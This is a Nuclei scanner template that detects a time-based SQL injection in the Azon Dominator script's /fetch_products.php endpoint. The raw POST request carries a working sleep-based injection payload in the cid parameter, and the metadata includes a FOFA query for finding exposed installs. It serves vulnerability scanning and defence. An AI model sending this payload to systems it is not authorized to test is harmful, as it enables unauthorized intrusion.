id: azon-dominator-sqli
info:
  name: Azon Dominator - SQL Injection
  author: s4e-io
  severity: high
  description: |
    Azon Dominator software is vulnerable to a sql attack at /fetch_products.php.
  reference:
    - https://www.exploit-db.com/exploits/52059
    - https://www.codester.com/items/12775/azon-dominator-affiliate-marketing-script
  classification:
    cwe-id:
      - CWE-89
  metadata:
    fofa-query: Azon Dominator
    max-request: 1
    verified: true
  tags: azon,dominator,sqli,time-based-sqli,vuln
http:
  - matchers:
      - condition: and
        # digest: 4a0a0047304502201e08c6871edfa4b6717549560828271054d954bbebde18de785b840a312a911c022100959e7796b2456e1558c38ab0a523a80348e4d85901faae4be41ed83fcad67d79:922c64590222798bb761d5b6d8e72950

        dsl:
          - duration>=6
          - status_code==500
          - contains_all(body, "id", "name", "save_lists.php")
        type: dsl
    raw:
      - |
        @timeout 20s
        POST /fetch_products.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        cid=1*if(now()=sysdate()%2Csleep(6)%2C0)&max_price=124&minimum_range=0&sort=112
